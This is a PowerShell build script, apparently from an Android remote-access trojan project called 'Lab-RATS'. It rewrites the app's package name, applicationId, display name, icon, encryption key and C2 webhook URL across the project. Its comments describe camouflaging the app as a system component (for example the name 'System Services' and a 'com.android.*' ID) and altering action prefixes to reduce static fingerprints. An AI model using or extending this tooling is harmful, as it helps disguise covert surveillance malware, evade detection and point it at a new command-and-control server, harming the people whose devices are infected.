<#
.SYNOPSIS
    Lab-RATS global identity rename tool (produced by stealth-verify).
    Parameterized replacement of package / app name / applicationId / C2 URL /
    encryption key / icon / intent-action prefix.

.DESCRIPTION
    Coverage:
      - app/build.gradle      : namespace / applicationId / versionName / ENCRYPTION_KEY default
      - AndroidManifest.xml   : fully-qualified component names (services/receivers)
      - java sources          : package decl, imports, hardcoded "com.labs.labrats" component names
      - java directories      : app/src/main/java/com/labs/labrats -> new package path (also src/test)
      - proguard-rules.pro    : -keep com.labs.labrats.* -> new package (REQUIRED, else R8 strips core services)
      - strings.xml           : app_name / content_desc_logo
      - Constants.java        : "com.labs.pghth." action prefix (optional, via -NewActionPrefix)
      - local.properties      : WEBHOOK_URL / ENCRYPTION_KEY
      - mipmap icons          : -IconPath PNG -> mipmap-*/ic_launcher.webp (PNG bytes; see warning)
                                 and drawable entry icons (default_app_icon.png, app_logo.png, ...)

.PARAMETER NewPackage
    New namespace (R class + real component class prefix), e.g. com.example.myapp.
    Also used to migrate the java package directories and package declarations.

.PARAMETER NewApplicationId
    New applicationId (value returned by getPackageName() at runtime). Defaults to NewPackage.
    Hardcoded component names are rewritten to NewPackage, so a diverging applicationId
    (e.g. com.android.* camouflage prefix) keeps alias switching functional - this is the
    exact defect of the stock apk-builder, which only edits applicationId.

.PARAMETER AppName
    New launcher/settings display name -> strings.xml app_name.

.PARAMETER C2Url
    New C2 webhook URL -> local.properties WEBHOOK_URL (Google Script or Render URL).

.PARAMETER EncryptionKey
    New build-time encryption key -> local.properties ENCRYPTION_KEY (16+ random chars).

.PARAMETER NewActionPrefix
    Optional. Replaces the "com.labs.pghth" prefix in Constants.java to reduce static fingerprints.

.PARAMETER IconPath
    Optional. PNG icon (512x512 or 1024x1024). Scaled with .NET System.Drawing and written to
    mipmap-mdpi/hdpi/xhdpi/xxhdpi/xxxhdpi ic_launcher.webp (48/72/96/144/192 px) plus drawable
    entry icons. Skipped when omitted.

.PARAMETER VersionName
    Optional. New versionName (otherwise left unchanged).

.PARAMETER DryRun
    Print the change plan without writing anything.

.EXAMPLE
    .\rename.ps1 -NewPackage com.example.stability -AppName "System Services" -C2Url "https://my-c2.onrender.com" -DryRun
    .\rename.ps1 -NewPackage com.example.stability -NewApplicationId com.android.sys.stab -AppName "System Services" -EncryptionKey "Xk9#mQ2$vL8@nP4!" -C2Url "https://my-c2.onrender.com" -IconPath C:\icons\gear.png
#>
[CmdletBinding()]
Param(
    [string]$NewPackage,
    [string]$NewApplicationId,
    [string]$AppName,
    [string]$C2Url,
    [string]$EncryptionKey,
    [string]$NewActionPrefix,
    [string]$IconPath,
    [string]$VersionName,
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir          # patches/ parent = repo root
$AppMain = Join-Path $ProjectDir 'app\src\main'
$AppTest = Join-Path $ProjectDir 'app\src\test'

$OLD_PKG = 'com.labs.labrats'
$OLD_PKG_PATH = $OLD_PKG -replace '\.', '\'
$OLD_ACTION_PREFIX = 'com.labs.pghth'

if ([string]::IsNullOrWhiteSpace($NewApplicationId)) { $NewApplicationId = $NewPackage }

function Get-Utf8([string]$Path) {
    $enc = New-Object System.Text.UTF8Encoding($false)
    return [System.IO.File]::ReadAllText($Path, $enc)
}
function Set-Utf8([string]$Path, [string]$Content) {
    if ($DryRun) { return }
    $enc = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($Path, $Content, $enc)
}

$plan = New-Object System.Collections.Generic.List[object]
function Add-Plan([string]$File, [string]$What) {
    $plan.Add([pscustomobject]@{ File = $File; Action = $What })
}

# ---------- 1) Java sources: package decl / imports / hardcoded component pkg / action prefix ----------
if ($NewPackage) {
    $javaFiles = @(Get-ChildItem -Path $AppMain, $AppTest -Recurse -Filter *.java -ErrorAction SilentlyContinue)
    foreach ($f in $javaFiles) {
        $c = Get-Utf8 $f.FullName
        $newC = $c
        $hits = @()
        if ($newC -match ('package\s+' + [regex]::Escape($OLD_PKG))) { $hits += 'package decl' }
        if ($newC.Contains('import ' + $OLD_PKG)) { $hits += 'imports' }
        if ($newC.Contains('"com.labs.labrats')) { $hits += 'hardcoded component pkg' }
        if ($newC.Contains($OLD_ACTION_PREFIX)) { $hits += 'intent action prefix' }
        if ($hits.Count -gt 0) {
            $newC = $newC -replace ('package\s+' + [regex]::Escape($OLD_PKG)), ('package ' + $NewPackage)
            $newC = $newC -replace ('import\s+' + [regex]::Escape($OLD_PKG)), ('import ' + $NewPackage)
            $newC = $newC.Replace('"com.labs.labrats', ('"' + $NewPackage))
            if ($NewActionPrefix) { $newC = $newC.Replace($OLD_ACTION_PREFIX, $NewActionPrefix) }
            Add-Plan $f.FullName ('rewrite: ' + ($hits -join ', '))
            Set-Utf8 $f.FullName $newC
        }
    }
}

# ---------- 2) Directory migration java/com/labs/labrats -> new path ----------
if ($NewPackage) {
    $newPkgPath = $NewPackage -replace '\.', '\'
    $oldDirMain = Join-Path $AppMain ('java\' + $OLD_PKG_PATH)
    $oldDirTest = Join-Path $AppTest ('java\' + $OLD_PKG_PATH)
    $newDirMain = Join-Path $AppMain ('java\' + $newPkgPath)
    $newDirTest = Join-Path $AppTest ('java\' + $newPkgPath)

    $pairs = @()
    $pairs += ,@($oldDirMain, $newDirMain)
    $pairs += ,@($oldDirTest, $newDirTest)
    foreach ($pair in $pairs) {
        $src = $pair[0]; $dst = $pair[1]
        if (Test-Path $src) {
            Add-Plan $src ('move dir -> ' + $dst)
            if (-not $DryRun) {
                New-Item -ItemType Directory -Force -Path (Split-Path -Parent $dst) | Out-Null
                if (Test-Path $dst) {
                    Get-ChildItem $src -Recurse -File | ForEach-Object {
                        $rel = $_.FullName.Substring($src.Length)
                        Move-Item $_.FullName (Join-Path $dst $rel.TrimStart('\')) -Force
                    }
                } else {
                    Move-Item $src $dst
                }
            }
        }
    }
}

# ---------- 3) app/build.gradle ----------
$buildGradle = Join-Path $ProjectDir 'app\build.gradle'
if (Test-Path $buildGradle) {
    $c = Get-Utf8 $buildGradle
    $hits = @()
    if ($NewPackage -and ($c -match ("namespace\s+'" + [regex]::Escape($OLD_PKG) + "'"))) { $hits += 'namespace' }
    if ($NewApplicationId -and ($c -match 'applicationId\s+"[^"]+"')) { $hits += 'applicationId' }
    if ($VersionName -and ($c -match 'versionName\s+"[^"]+"')) { $hits += 'versionName' }
    if ($EncryptionKey -and ($c -match 'ENCRYPTION_KEY"\s*\?:\s*"[^"]*"')) { $hits += 'ENCRYPTION_KEY default' }
    if ($hits.Count -gt 0) {
        if ($NewPackage) { $c = $c -replace ("namespace\s+'" + [regex]::Escape($OLD_PKG) + "'"), ("namespace '" + $NewPackage + "'") }
        if ($NewApplicationId) { $c = $c -replace 'applicationId\s+"[^"]+"', ('applicationId "' + $NewApplicationId + '"') }
        if ($VersionName) { $c = $c -replace 'versionName\s+"[^"]+"', ('versionName "' + $VersionName + '"') }
        if ($EncryptionKey) { $c = $c -replace 'ENCRYPTION_KEY"\s*\?:\s*"[^"]*"', ('ENCRYPTION_KEY" ?: "' + $EncryptionKey + '"') }
        Add-Plan $buildGradle ($hits -join ', ')
        Set-Utf8 $buildGradle $c
    }
}

# ---------- 4) AndroidManifest.xml fully-qualified component names ----------
$manifest = Join-Path $AppMain 'AndroidManifest.xml'
if (Test-Path $manifest) {
    $c = Get-Utf8 $manifest
    if ($NewPackage -and $c.Contains($OLD_PKG)) {
        $n = ([regex]::Matches($c, [regex]::Escape($OLD_PKG))).Count
        $c = $c.Replace($OLD_PKG, $NewPackage)
        Add-Plan $manifest ('rewrite ' + $n + ' occurrences ' + $OLD_PKG + ' -> ' + $NewPackage)
        Set-Utf8 $manifest $c
    }
}

# ---------- 5) proguard-rules.pro (CRITICAL: missing = stripped core services) ----------
$proguard = Join-Path $ProjectDir 'app\proguard-rules.pro'
if (Test-Path $proguard) {
    $c = Get-Utf8 $proguard
    if ($NewPackage -and $c.Contains($OLD_PKG)) {
        $c = $c.Replace($OLD_PKG, $NewPackage)
        Add-Plan $proguard ('-keep rules pkg ' + $OLD_PKG + ' -> ' + $NewPackage)
        Set-Utf8 $proguard $c
    }
    if ($NewApplicationId -and ($c -match "-repackageclasses '[^']+'")) {
        $base = if ($NewPackage) { $NewPackage } else { $NewApplicationId }
        $repkg = 'com.internal.' + ($base -replace '[^a-zA-Z0-9_]', '')
        if ($repkg.Length -gt 60) { $repkg = $repkg.Substring(0, 60) }
        $c = $c -replace "-repackageclasses '[^']+'", ("-repackageclasses '" + $repkg + "'")
        Add-Plan $proguard ('-repackageclasses -> ' + $repkg)
        Set-Utf8 $proguard $c
    }
}

# ---------- 6) strings.xml ----------
$stringsXml = Join-Path $AppMain 'res\values\strings.xml'
if ((Test-Path $stringsXml) -and $AppName) {
    $c = Get-Utf8 $stringsXml
    $c = $c -replace '<string name="app_name">.*</string>', ('<string name="app_name">' + $AppName + '</string>')
    $c = $c -replace '<string name="content_desc_logo">.*</string>', ('<string name="content_desc_logo">' + $AppName + '</string>')
    Add-Plan $stringsXml ('app_name -> ' + $AppName)
    Set-Utf8 $stringsXml $c
}

# ---------- 7) local.properties (C2 URL + encryption key) ----------
$localProps = Join-Path $ProjectDir 'local.properties'
$lpLines = New-Object System.Collections.Generic.List[string]
if (Test-Path $localProps) { $lpLines.AddRange([System.IO.File]::ReadAllLines($localProps)) }
$lpChanged = @()
if ($C2Url) {
    $idx = -1
    for ($i = 0; $i -lt $lpLines.Count; $i++) { if ($lpLines[$i] -like 'WEBHOOK_URL=*') { $idx = $i; break } }
    $line = 'WEBHOOK_URL=' + $C2Url
    if ($idx -ge 0) { $lpLines[$idx] = $line } else { $lpLines.Add($line) }
    $lpChanged += 'WEBHOOK_URL'
}
if ($EncryptionKey) {
    $idx = -1
    for ($i = 0; $i -lt $lpLines.Count; $i++) { if ($lpLines[$i] -like 'ENCRYPTION_KEY=*') { $idx = $i; break } }
    $line = 'ENCRYPTION_KEY=' + $EncryptionKey
    if ($idx -ge 0) { $lpLines[$idx] = $line } else { $lpLines.Add($line) }
    $lpChanged += 'ENCRYPTION_KEY'
}
if ($lpChanged.Count -gt 0) {
    Add-Plan $localProps ($lpChanged -join ', ')
    if (-not $DryRun) {
        if (-not (Test-Path $localProps)) { New-Item -ItemType File -Path $localProps | Out-Null }
        [System.IO.File]::WriteAllLines($localProps, $lpLines)
    }
}

# ---------- 8) Icon replacement (mipmap + drawable entries) ----------
if ($IconPath -and (Test-Path $IconPath)) {
    Add-Type -AssemblyName System.Drawing
    $src = [System.Drawing.Image]::FromFile((Resolve-Path $IconPath).Path)
    $sizes = @{ 'mdpi' = 48; 'hdpi' = 72; 'xhdpi' = 96; 'xxhdpi' = 144; 'xxxhdpi' = 192 }
    foreach ($dpi in $sizes.Keys) {
        $target = Join-Path $AppMain ('res\mipmap-' + $dpi + '\ic_launcher.webp')
        if (Test-Path $target) {
            $px = $sizes[$dpi]
            $bmp = New-Object System.Drawing.Bitmap($src, $px, $px)
            Add-Plan $target ('replace icon ' + $dpi + ' ' + $px + 'px')
            if (-not $DryRun) {
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                $bytes = $ms.ToArray()
                [System.IO.File]::WriteAllBytes($target, $bytes)
                $ms.Dispose(); $bmp.Dispose()
            }
        }
    }
    foreach ($name in @('default_app_icon.png', 'app_logo.png', 'default_app_icon_robot.png', 'labrats_internal_logo.png')) {
        $p = Join-Path $AppMain ('res\drawable\' + $name)
        if (Test-Path $p) {
            Add-Plan $p ('replace drawable ' + $name + ' with new icon')
            if (-not $DryRun) { Copy-Item $IconPath $p -Force }
        }
    }
    $src.Dispose()
    Write-Warning 'mipmap .webp targets were overwritten with PNG bytes. If aapt2 rejects the mime, convert to real webp (cwebp/ImageMagick) and rerun, or rerun without -IconPath (icon replacement is optional).'
}

# ---------- Report ----------
Write-Host ''
Write-Host ('Project root : ' + $ProjectDir) -ForegroundColor Cyan
Write-Host ('DryRun       : ' + $DryRun) -ForegroundColor Cyan
Write-Host ('NewPackage   : ' + $NewPackage) -ForegroundColor Cyan
Write-Host ('ApplicationId: ' + $NewApplicationId) -ForegroundColor Cyan
Write-Host ''
Write-Host ('Planned changes: ' + $plan.Count) -ForegroundColor Yellow
$plan | Format-Table -AutoSize -Wrap | Out-String -Width 200 | Write-Host

if ($DryRun) {
    Write-Host '[DryRun] Nothing written. Remove -DryRun and rerun to apply.' -ForegroundColor Green
} else {
    Write-Host '[DONE] Changes applied. Next: cd repo; gradlew.bat assembleRelease to verify.' -ForegroundColor Green
    Write-Host '       Also align the default Package ID prompt inside apk-builder/build.ps1 with the new package.' -ForegroundColor Green
}
